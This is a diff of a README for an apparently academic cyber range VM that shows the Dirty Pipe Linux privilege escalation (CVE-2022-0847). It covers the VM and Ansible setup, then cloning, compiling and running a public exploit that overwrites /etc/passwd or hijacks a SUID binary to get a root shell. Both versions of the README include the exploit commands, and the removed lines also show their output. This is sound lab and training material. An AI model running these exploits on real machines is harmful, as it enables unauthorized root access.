@@ -5,63 +5,67 @@
 
 The Cyber Range has been updated to run on Ubuntu 20-4 with a manually installed Kernel version 5.8.0
 
-To get started, install the ***.ova** file* and open it up in your Virtual Machine application of choice. I used VMware Workstation so see 'Step-1: Prepare Target System" directions for the setup on VMware Workstation. 
+To get started, install the ***.ova** file* and open it up in your Virtual Machine application of choice. I used VMware Workstation. You can look at 'Step-1: Prepare Target System" directions for the setup on VMware Workstation. 
 
 The .OVA image of the cyber range has the exploit installed, however, it does not have Ansible installed nor does it have other users. 
 A link to the .OVA https://drive.google.com/drive/folders/1ANb-LaDyDZGe_ZivHizJ7Gqs2xRV9Dbk?usp=share_link
 
 
-**Once you're on the machine do the following:**
+# Cyber Range Setup Instructions
 
-1. Install Ansible:
-```sudo apt install ansible```
+## Step 1: Download and Install the Cyber Range
 
-2. Install unzip:
-```sudo apt install unzip```
+1.  Download the .OVA image of the cyber range from the following link: [Google Drive Link](https://drive.google.com/drive/folders/1ANb-LaDyDZGe_ZivHizJ7Gqs2xRV9Dbk?usp=share_link)
+    
+2.  Open the downloaded _**.ova** file_ in your Virtual Machine application of choice (e.g., VMware Workstation). If you need help setting up VMware Workstation, refer to the "Prepare Target System" directions below.
+3.  Log in with User: exploit and password: exploit.
 
-3. Use wget to download this repo
-```wget https://github.com/kwxk/Rutgers_Cyber_Range/archive/refs/heads/main.zip```
-4. ```ls```
-   Check if kwkx Rutgers_Cyber_Cyber_Range zip file is there.
-5. ```unzip main.zip```
-6.  ```ls```
- List the files. Change the directory to the directory of the cyber range files
-7. cd into bare metal folder
-8. ```chmod +x ./* ```
-When you are in the directory of the cyber range files run the following command (chmod +x ./*) to make all files in the directory executable. This is necessary because we need to run these files later on. 
+## Step 2: Set Up Ansible
 
+Once you're logged in to the Cyber Range machine, follow these steps:
 
-This Cyber Range/Hackbox was set up for a debian system. Run the ansible-playbook **main_debian.yml** 
-```
-ansible-playbook main_debian.yml
-```
-The regular main.yml is set up for Redhat/Fedora Systems. In theory, Fedora 28 and earlier versions of Fedora have affected Kernels. You could download a Fedora ISO from the Fedora ISO archive and then manually install Kernel 5.8.0 to the Kernel. Then, you can run the main.yml with the Redhat Ansible package names. 
-https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/23/Workstation/x86_64/iso/ 
+1.  Install Ansible: `sudo apt install ansible`
+2.  Install unzip: `sudo apt install unzip`
+3.  Download the repository using wget: `wget https://github.com/kwxk/Rutgers_Cyber_Range/archive/refs/heads/main.zip`
+4.  Check if the kwkx Rutgers_Cyber_Cyber_Range zip file is there: `ls`
+5.  Unzip the downloaded repository: `unzip main.zip`
+6.  List the files and change the directory to the directory of the cyber range files: `ls`
+7.  Change the directory to the bare metal folder.
+8.  Make all files in the directory executable: `chmod +x ./*`
 
+## Step 3: Run the Ansible Playbook
 
+1.  Run the ansible-playbook `main_debian.yml` for Debian systems: `ansible-playbook main_debian.yml`
 
----
+For Redhat/Fedora systems, run the regular `main_redhat.yml` after installing the correct kernel version and Ansible package names. You can find the Fedora ISO archive [here](https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/23/Workstation/x86_64/iso/).
 
+## Step 4: Exploit the Vulnerability
+
+1.  The Cyber Range machine already has Alexis Ahmed's exploit for Dirty Pipe installed. Follow the instructions in the "CVE-2022-0847-DirtyPipe-Exploits Scan" section below to prepare the target system, install dependencies, check the kernel version for vulnerability, and download and compile the CVE-2022-0847-DirtyPipe-Exploits scanner.
+    
+2.  Run the CVE-2022-0847-DirtyPipe-Exploits scanner using the provided instructions in "Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner" section below.
+    
+
+### Note
+
+This Cyber Range/Hackbox was set up for a Debian system. If you're using Fedora 28 or earlier versions, you will need to manually install Kernel 5.8.0 to exploit the vulnerability.
 
 # CVE-2022-0847-DirtyPipe-Exploits Scan
 
 ## Step-1: Prepare Target System:
-1	Download “Exploit-Target-Ubuntu-20-4.ova”  
-2	Open VMware workstation and go to “File>Open”:  
- 
-3	Browse and select “Exploit-Target-Ubuntu-20-4.ova” file: 
-  
-4	Set a name for VM and select the location to store it and click on Import:
- 
-5	Importing OVA:
- 
-6	Finally, the VM is ready to play and start it:
- 
-7	Now login with User: exploit password: exploit
- 
-⦁	Now the system is ready:
- 
+
+1.  Download “Exploit-Target-Ubuntu-20-4.ova” (already covered in the main instructions).
+2.  Open VMware workstation and go to “File>Open”.
+3.  Browse and select “Exploit-Target-Ubuntu-20-4.ova” file.
+4.  Set a name for VM, select the location to store it, and click on Import.
+5.  Import the OVA.
+6.  Start the VM.
+7.  Log in with User: exploit and password: exploit.
+
+⦁ Now the system is ready.
+
 ## Step-2: Install dependency and Check kernel version for vulnerability:
+
 ⦁	Start the VM and login with User: exploit Password: exploit
 ⦁	Open Terminal and check the kernel and OS version:
 ```
@@ -78,7 +82,8 @@ PRETTY_NAME="Ubuntu 20.04.3 LTS"
 ```
 ⦁	You will need to have GCC and Git installed:
 ```sudo apt install gcc git -y```
-## Step-3: Download and Compile CVE-2022-0847-DirtyPipe-Exploits Scanner:
+
+## Step-3: Download and Compile CVE
 ⦁	After successfully install git, gcc now clone the exploits scanner from GitHub:
  git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
  
@@ -99,45 +104,25 @@ cd CVE-2022-0847-DirtyPipe-Exploits
 chmod +x compile.sh
 ./compile.sh
 ```
+
 ## Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner:
-⦁	After successfully complied you’re able to run exploit-1:
-```
-./exploit-1
-Backing up /etc/passwd to /tmp/passwd.bak ...
-Setting root password to "piped"...
-Password: Restoring /etc/passwd from /tmp/passwd.bak...
-Done! Popping shell... (run commands now)
 
-whoami
-root
-```
-⦁	To exit from this console type exit and press enter twice:
-exit
-```
-$
-⦁	Run exploit-2:
-./exploit-2 /usr/bin/sudo
-[+] hijacking suid binary..
-[+] dropping suid shell..
-[+] restoring suid binary..
-[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+1.  Run exploit-1: `./exploit-1`
+2.  Verify that you have root access by running `whoami`. The output should be `root`.
+3.  To exit the console, type `exit` and press enter twice.
+4.  Run exploit-2: `./exploit-2 /usr/bin/sudo`
+5.  Verify again that you have root access by running `whoami`. The output should be `root`.
+6.  To exit the console, type `exit`.
 
-whoami
-root
+### Affected Versions
 
-exit
-```
+Linux kernel versions newer than 5.8 are affected. The vulnerability has been patched in the following Linux kernel versions:
 
-### Affected versions
-Linux kernel versions newer than 5.8 are affected.
-So far the vulnerability has been patched in the following Linux kernel versions:
-**5.16.11
-5.15.25
-5.10.102**
-You can learn more about the vulnerability here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847
+-   5.16.11
+-   5.15.25
+-   5.10.102
 
-
----
+You can learn more about the vulnerability here: [CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
 
 # Playbook Breakdown
 
